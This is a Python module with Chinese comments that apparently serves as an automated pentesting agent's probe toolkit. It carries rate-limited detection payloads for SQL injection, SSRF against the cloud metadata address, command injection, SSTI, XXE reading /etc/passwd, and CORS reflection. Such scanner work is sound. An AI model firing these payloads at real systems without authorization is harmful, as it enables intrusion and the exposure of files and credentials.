"""专项漏洞探测工具（纯规则、复用 executor.http_request，限量限速防 DoS）。

把「LLM 自主构造请求测漏洞」升级为「结构化可执行探测」：

- sqli_probe     : SQL 注入探测（报错型/布尔型/时间型三类），只读为主
- upload_probe   : 上传接口无害探测（不落 webshell，只传纯文本/图片占位）
- access_boundary: 权限边界测试（无认证 vs 当前会话，判定未授权/越权信号）

全部天然受任务禁止操作硬拦约束；探测只给「信号 + 引导」，实锤仍需
worker 用 http_request 复现取证后 submit_finding。
"""
from __future__ import annotations

import re
import time
from typing import Any, Optional

# 探测硬上限，防异常站点拖垮 worker 与目标。
_SQLI_MAX_REQUESTS = 8
_SQLI_DELAY = 0.3
_SQLI_TIME_SLEEP = 2          # 时间型 sleep 秒数（只测一次，短 sleep 不悬挂）
_SQLI_TIME_THRESHOLD = 1.5    # 耗时差阈值（秒）
_SQLI_LEN_RATIO = 0.10        # 布尔型响应长度差异阈值（比例）
_UPLOAD_MAX_TRIES = 2
_BOUNDARY_MAX_REQUESTS = 2

# 各数据库报错特征（小写匹配）。
_SQL_ERROR_MARKERS = (
    # MySQL / MariaDB
    "you have an error in your sql syntax", "mysql_fetch", "warning: mysql",
    "sqlstate", "mariadb", "mysqli",
    # Oracle
    "ora-", "oracle error", "quoted string not properly terminated",
    # MSSQL
    "sql server", "microsoft ole db", "unclosed quotation mark",
    "line 1:", "incorrect syntax near",
    # PostgreSQL
    "postgresql", "pg_query", "psql", "syntax error at or near",
    # 通用
    "sql injection", "syntax error", "unclosed quotation", 'near "',
    "sqlcommand", "sqlsyntaxerror",
)

# 报错型 payload：单引号/双引号/闭合变体，触发数据库报错。
_ERROR_PAYLOADS = (
    ("单引号", "'"),
    ("双引号", '"'),
    ("单引号括号", "')"),
    ("注释闭合", "' AND '1'='1'-- -"),
)

# 布尔型 payload：真/假对照。
_BOOL_TRUE = "1 AND 1=1"
_BOOL_FALSE = "1 AND 1=2"

# 时间型 payload：sleep 触发。
_TIME_PAYLOAD = "1 AND SLEEP({s})"


def _replace_param(url: str, param_name: str, value: str) -> str:
    """把 url 里 param_name=旧值 替换为 param_name=value；无该参数则追加到 query。"""
    pat = re.compile(rf"([?&]{re.escape(param_name)}=)[^&\s]*")
    if pat.search(url):
        return pat.sub(rf"\g<1>{value}", url)
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}{param_name}={value}"


def _status_len(resp: dict) -> tuple[int, int]:
    try:
        return int(resp.get("status_code") or 0), int(resp.get("body_len") or 0)
    except Exception:
        return 0, 0


def _has_sql_error(body: str) -> bool:
    low = (body or "").lower()
    return any(m in low for m in _SQL_ERROR_MARKERS)


def sqli_probe(
    executor: Any,
    url: str = "",
    param_name: str = "",
    method: str = "GET",
    probe_types: Optional[list[str]] = None,
    timeout: int = 12,
) -> dict[str, Any]:
    """SQL 注入探测：对目标参数做报错型/布尔型/时间型三类无害探测。

    报错型：注入单引号/双引号/闭合变体，检测数据库报错特征（MySQL/Oracle/MSSQL/PG）。
    布尔型：1=1 与 1=2 对照，响应长度差异超阈值提示布尔注入。
    时间型：SLEEP(2) 与基线耗时对比，超阈值提示时间盲注。
    全部只读/无害、限量限速；命中只是信号，需 http_request 复现取证再 submit_finding。
    """
    url = (url or "").strip()
    if not url:
        return {"ok": False, "kind": "arg_error", "error": "url 不能为空。"}
    if not (param_name or "").strip():
        return {"ok": False, "kind": "arg_error", "error": "param_name 不能为空：要探测哪个参数？"}
    types = [t for t in (probe_types or ["error", "bool", "time"]) if t in ("error", "bool", "time")]
    if not types:
        types = ["error", "bool", "time"]

    results: list[dict] = []
    signals: list[str] = []
    request_count = 0

    def _send(value: str) -> dict:
        nonlocal request_count
        request_count += 1
        try:
            return executor.http_request(
                _replace_param(url, param_name, value), method=method,
                timeout=int(timeout or 12),
            )
        except Exception as e:
            return {"ok": False, "status_code": 0, "body": "", "body_len": 0, "error": str(e)}

    # 报错型
    if "error" in types:
        for label, payload in _ERROR_PAYLOADS:
            if request_count >= _SQLI_MAX_REQUESTS:
                break
            resp = _send(payload)
            st, ln = _status_len(resp)
            body = resp.get("body") or ""
            hit = _has_sql_error(body)
            results.append({
                "type": "error", "payload": label, "value": payload,
                "status": st, "body_len": ln, "sql_error": hit,
            })
            if hit:
                signals.append(f"报错型：{label} 触发数据库报错特征")
            time.sleep(_SQLI_DELAY)

    # 布尔型
    if "bool" in types and request_count < _SQLI_MAX_REQUESTS:
        base = _send(_BOOL_TRUE)
        if request_count < _SQLI_MAX_REQUESTS:
            alt = _send(_BOOL_FALSE)
            b_st, b_len = _status_len(base)
            a_st, a_len = _status_len(alt)
            diff_ratio = abs(b_len - a_len) / max(1, b_len) if b_len else 0.0
            results.append({
                "type": "bool", "payload": "1=1 vs 1=2",
                "true_status": b_st, "true_len": b_len,
                "false_status": a_st, "false_len": a_len,
                "len_diff_ratio": round(diff_ratio, 3),
            })
            if a_st == b_st and diff_ratio >= _SQLI_LEN_RATIO and b_len > 0:
                signals.append(f"布尔型：1=1 与 1=2 响应长度差异 {round(diff_ratio*100)}%（{b_len} vs {a_len}）")
            time.sleep(_SQLI_DELAY)

    # 时间型
    if "time" in types and request_count < _SQLI_MAX_REQUESTS:
        t0 = time.time()
        base = _send("1")
        base_elapsed = time.time() - t0
        if request_count < _SQLI_MAX_REQUESTS:
            t0 = time.time()
            _send(_TIME_PAYLOAD.format(s=_SQLI_TIME_SLEEP))
            sleep_elapsed = time.time() - t0
            results.append({
                "type": "time", "payload": f"SLEEP({_SQLI_TIME_SLEEP})",
                "base_elapsed": round(base_elapsed, 2),
                "sleep_elapsed": round(sleep_elapsed, 2),
            })
            if sleep_elapsed - base_elapsed >= _SQLI_TIME_THRESHOLD:
                signals.append(
                    f"时间型：SLEEP({_SQLI_TIME_SLEEP}) 耗时 {round(sleep_elapsed,1)}s vs 基线 {round(base_elapsed,1)}s"
                )

    if not signals:
        verdict = "negative"
        guidance = ("三类探测均无明显注入信号。可能是参数被过滤/非 SQL 场景，换参数或换业务功能再试，"
                    "不要凭「参数可控」就提交。")
    else:
        verdict = "likely"
        guidance = ("命中注入信号，用 http_request 对同一参数复现取证（保留原始请求/响应），"
                    "确认实际危害（报错泄露/数据差异/延时）后再 submit_finding。")

    return {
        "ok": True,
        "url": url,
        "param_name": param_name,
        "probe_types": types,
        "results": results,
        "signals": signals,
        "verdict": verdict,
        "guidance": guidance,
    }


def upload_probe(
    executor: Any,
    url: str = "",
    file_field: str = "file",
    filename: str = "test.txt",
    content_type: str = "text/plain",
    timeout: int = 15,
) -> dict[str, Any]:
    """上传接口无害探测：只传纯文本占位文件，验证接口是否存在/是否校验类型大小。

    绝不传可执行文件（.php/.jsp/.asp/.sh 等）；只传 text/plain 的 test.txt 或
    图片占位，内容为无害文本。命中「上传成功/返回路径/大小限制」只是接口信号，
    不代表可上传恶意文件，需人工/worker 按实际业务危害确认后再提交。
    """
    url = (url or "").strip()
    if not url:
        return {"ok": False, "kind": "arg_error", "error": "url 不能为空：上传接口地址。"}
    fname = (filename or "test.txt").strip()
    # 硬拦危险扩展名：探测绝不落可执行文件。
    if re.search(r"\.(php\d*|jsp|jspx|asp|aspx|ashx|sh|py|pl|cgi|exe|bat|cmd|war|jar)$", fname, re.IGNORECASE):
        return {"ok": False, "kind": "arg_error",
                "error": f"filename 含可执行扩展名（{fname}），探测只允许无害文本/图片占位文件。"}
    field = (file_field or "file").strip()
    content = "riddle-upload-probe harmless text file. 1234567890"

    tries = 0
    results: list[dict] = []
    signals: list[str] = []
    for _ in range(_UPLOAD_MAX_TRIES):
        tries += 1
        try:
            resp = executor.http_request(
                url, method="POST", timeout=int(timeout or 15),
                data=f"--riddle-boundary\r\nContent-Disposition: form-data; name=\"{field}\"; "
                     f"filename=\"{fname}\"\r\nContent-Type: {content_type}\r\n\r\n"
                     f"{content}\r\n--riddle-boundary--\r\n",
                headers={"Content-Type": "multipart/form-data; boundary=riddle-boundary"},
            )
        except Exception as e:
            results.append({"try": tries, "ok": False, "error": str(e)})
            break
        st, ln = _status_len(resp)
        body = resp.get("body") or ""
        low = body.lower()
        uploaded = any(k in low for k in (
            "upload success", "uploaded", "上传成功", "上传成功", "文件已上传",
            "success", "ok", "saved", "stored",
        )) and st in (200, 201, 204)
        path_hint = re.search(r"(?:/upload[s]?/|/files?/|/static/)[^\"'\s<>]+", body)
        size_limit = any(k in low for k in ("too large", "大小超", "文件过大", "exceeds", "limit"))
        results.append({
            "try": tries, "status": st, "body_len": ln,
            "uploaded": uploaded, "path_hint": path_hint.group(0) if path_hint else "",
            "size_limit_hint": size_limit,
        })
        if uploaded:
            signals.append(f"第{tries}次上传返回成功（status {st}）")
        if path_hint:
            signals.append(f"响应含上传路径线索：{path_hint.group(0)}")
        if size_limit:
            signals.append("响应含大小限制提示（接口在解析上传内容）")
        if st in (200, 201, 204):
            break  # 已确认接口可达，不再多发

    if not signals:
        verdict = "negative"
        guidance = ("未观察到上传接口信号。可能是路径不对/接口拒绝/需登录，换入口或先 login_session 再试。")
    else:
        verdict = "likely"
        guidance = ("上传接口可达且有响应信号。这只是「接口存在」线索，不代表可传恶意文件；"
                    "按实际业务危害确认（如是否真落盘、是否可访问返回路径）后再提交。")

    uploaded_any = any(r.get("uploaded") for r in results if isinstance(r, dict))
    side_effects: list[str] = []
    if uploaded_any:
        side_effects.append(
            f"已向目标上传占位文件 {fname}（text/plain，内容为无害标记文本），"
            f"该文件留在目标服务器上无法自动删除，提交漏洞时需说明此副作用。"
        )

    return {
        "ok": True,
        "url": url,
        "file_field": field,
        "filename": fname,
        "results": results,
        "signals": signals,
        "verdict": verdict,
        "side_effects": side_effects,
        "guidance": guidance,
    }


def access_boundary(
    executor: Any,
    url: str = "",
    method: str = "GET",
    data: str = "",
    timeout: int = 12,
) -> dict[str, Any]:
    """权限边界测试：无认证 vs 当前会话，判定未授权访问/越权信号。

    先清空会话发一次（无认证视角），再用当前维持的会话发一次（已登录视角），
    对比状态码/响应长度/内容差异。若无认证也能拿到与登录态相同或更敏感的内容，
    提示未授权访问；若两者差异大，说明鉴权生效。
    只读 GET 为主；POST 仅做无害验证请求。
    """
    url = (url or "").strip()
    if not url:
        return {"ok": False, "kind": "arg_error", "error": "url 不能为空：要测的接口地址。"}

    def _send(with_session: bool) -> dict:
        if with_session:
            return executor.http_request(url, method=method, data=data or None,
                                         timeout=int(timeout or 12))
        # 无认证视角：快照会话后清空，请求完毕（含异常）恢复原会话。
        snap = executor.snapshot_session()
        executor.session_set(clear=True)
        try:
            return executor.http_request(url, method=method, data=data or None,
                                         timeout=int(timeout or 12))
        finally:
            executor.restore_session(snap)

    anon = _send(False)
    authed = _send(True)
    a_st, a_len = _status_len(anon)
    u_st, u_len = _status_len(authed)
    anon_body = anon.get("body") or ""
    authed_body = authed.get("body") or ""

    signals: list[str] = []
    # 无认证也能 2xx 拿到内容 → 未授权访问信号
    if a_st in (200, 201, 204) and a_len > 0:
        signals.append(f"无认证访问返回 {a_st}（{a_len}B），疑似未授权访问")
    # 无认证 2xx 且内容与登录态高度相似 → 越权/鉴权缺失信号
    if a_st in (200, 201, 204) and u_st in (200, 201, 204) and a_len > 0:
        ratio = min(a_len, u_len) / max(1, max(a_len, u_len))
        if ratio >= 0.9:
            signals.append(f"无认证与登录态响应高度一致（{a_len}B vs {u_len}B），疑似鉴权缺失")
    # 无认证被拒（401/403/302）→ 鉴权生效，但提示可测越权
    if a_st in (401, 403, 302, 301):
        signals.append(f"无认证被拒（{a_st}），鉴权生效；可继续测水平/垂直越权（换他人资源 id）")

    if not signals:
        verdict = "negative"
        guidance = ("未观察到明显权限边界信号。可能接口本身公开或鉴权方式特殊，换敏感接口再测。")
    else:
        verdict = "likely"
        guidance = ("命中权限边界信号，用 http_request 复现取证（保留无认证 vs 登录态两组请求/响应），"
                    "确认实际可访问的敏感数据后再 submit_finding。")

    return {
        "ok": True,
        "url": url,
        "method": method,
        "anon": {"status": a_st, "body_len": a_len},
        "authed": {"status": u_st, "body_len": u_len},
        "signals": signals,
        "verdict": verdict,
        "guidance": guidance,
    }


# ---- injection_probe（CORS/SSRF/命令注入/SSTI/XXE 探针）----
_INJECT_MAX_REQUESTS = 12
_INJECT_DELAY = 0.2


def injection_probe(
    executor: Any,
    url: str = "",
    param_name: str = "",
    method: str = "GET",
    probe_types: Optional[list[str]] = None,
    timeout: int = 12,
) -> dict[str, Any]:
    """CORS/SSRF/命令注入/SSTI/XXE 五类注入探针（只读/无害、限量限速防 DoS）。

    - cors : 带任意 Origin 请求，检测 Access-Control-Allow-Origin 是否反射（配置错误）。
    - ssrf : 参数注入内部地址/云元数据地址，检测响应含内部地址/连接错误/元数据特征。
    - cmdi : 参数注入命令分隔符+回显标记，检测标记是否回显（命令执行信号）。
    - ssti : 参数注入 {{7*7}}/${7*7} 等模板表达式，检测 49 是否被求值。
    - xxe  : 构造含外部实体的 XML 请求体，检测文件内容/实体解析特征回显。
    全部只读、限量限速；命中只是信号，需 http_request 复现取证确认实际危害后再 submit_finding。
    """
    url = (url or "").strip()
    if not url:
        return {"ok": False, "kind": "arg_error", "error": "url 不能为空。"}
    if not (param_name or "").strip():
        return {"ok": False, "kind": "arg_error", "error": "param_name 不能为空：要探测哪个参数？"}
    types = [t for t in (probe_types or ["cors", "ssrf", "cmdi", "ssti", "xxe"])
             if t in ("cors", "ssrf", "cmdi", "ssti", "xxe")]
    if not types:
        types = ["cors", "ssrf", "cmdi", "ssti", "xxe"]

    results: list[dict] = []
    signals: list[str] = []
    request_count = 0

    def _send(value: str = "", extra_headers: Optional[dict] = None,
              body: str = "") -> Optional[dict]:
        nonlocal request_count
        if request_count >= _INJECT_MAX_REQUESTS:
            return None
        request_count += 1
        try:
            return executor.http_request(
                _replace_param(url, param_name, value) if value else url,
                method=method,
                headers=extra_headers,
                data=body or None,
                timeout=int(timeout or 12),
            )
        except Exception as e:
            return {"ok": False, "error": str(e)}

    # CORS 配置错误检测
    if "cors" in types:
        resp = _send(extra_headers={"Origin": "https://evil.example.com"})
        if resp and resp.get("ok"):
            hdrs = resp.get("response_headers") or {}
            acao = str(hdrs.get("access-control-allow-origin") or hdrs.get("Access-Control-Allow-Origin") or "")
            if acao and ("evil.example.com" in acao or acao == "*"):
                signals.append(f"CORS 配置错误：Access-Control-Allow-Origin 反射任意 Origin（{acao}）")
                results.append({"type": "cors", "signal": True, "acao": acao})
            else:
                results.append({"type": "cors", "signal": False, "acao": acao})
        time.sleep(_INJECT_DELAY)

    # SSRF 探测：注入内部/云元数据地址，检测响应特征
    if "ssrf" in types:
        for payload in ("http://127.0.0.1:80/", "http://169.254.169.254/latest/meta-data/"):
            resp = _send(payload)
            if resp and resp.get("ok"):
                low = (resp.get("body") or "").lower()
                sig = any(k in low for k in (
                    "ami-id", "instance-id", "meta-data", "127.0.0.1", "localhost",
                    "connection refused", "connect timeout", "无法连接", "拒绝连接",
                    "timed out", "timeout",
                ))
                if sig:
                    signals.append(f"SSRF 信号：注入 {payload} 后响应含内部地址/云元数据/连接错误特征")
                    results.append({"type": "ssrf", "signal": True, "payload": payload})
                else:
                    results.append({"type": "ssrf", "signal": False, "payload": payload})
            time.sleep(_INJECT_DELAY)

    # 命令注入探测：注入分隔符+回显标记
    if "cmdi" in types:
        marker = "RIDDLE_CMDI_7f3a9"
        for payload in (f"; echo {marker}", f"| echo {marker}", f"$(echo {marker})", f"`echo {marker}`"):
            resp = _send(payload)
            if resp and resp.get("ok"):
                if marker.lower() in (resp.get("body") or "").lower():
                    signals.append(f"命令注入信号：注入 {payload} 后响应回显标记 {marker}")
                    results.append({"type": "cmdi", "signal": True, "payload": payload})
                else:
                    results.append({"type": "cmdi", "signal": False, "payload": payload})
            time.sleep(_INJECT_DELAY)

    # SSTI 探测：注入模板表达式，检测 7*7=49 被求值
    if "ssti" in types:
        for payload in ("{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"):
            resp = _send(payload)
            if resp and resp.get("ok"):
                if "49" in (resp.get("body") or ""):
                    signals.append(f"SSTI 信号：注入 {payload} 后响应包含 49（模板表达式被求值）")
                    results.append({"type": "ssti", "signal": True, "payload": payload})
                else:
                    results.append({"type": "ssti", "signal": False, "payload": payload})
            time.sleep(_INJECT_DELAY)

    # XXE 探测：构造含外部实体的 XML，检测文件内容/解析特征回显
    if "xxe" in types:
        xxe_body = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<foo>&xxe;</foo>"
        )
        resp = _send(body=xxe_body)
        if resp and resp.get("ok"):
            low = (resp.get("body") or "").lower()
            sig = any(k in low for k in (
                "root:", "daemon:", "bin:", "win.ini", "[fonts]", "external entity",
                "doctype", "entity", "xml parsing", "parser error",
            ))
            if sig:
                signals.append("XXE 信号：XML 外部实体被解析（响应含文件内容/实体解析特征）")
                results.append({"type": "xxe", "signal": True})
            else:
                results.append({"type": "xxe", "signal": False})
        time.sleep(_INJECT_DELAY)

    if not signals:
        verdict = "negative"
        guidance = ("未观察到注入/配置错误信号。可能是参数不生效/被过滤/接口不同，换参数或入口再试。")
    else:
        verdict = "likely"
        guidance = ("命中注入/配置错误信号，用 http_request 复现取证（保留注入前后两组请求/响应），"
                    "确认实际危害（命令执行/文件读取/数据泄露/跨域读取）后再 submit_finding。")

    return {
        "ok": True,
        "url": url,
        "param_name": param_name,
        "probe_types": types,
        "results": results,
        "signals": signals,
        "verdict": verdict,
        "guidance": guidance,
    }
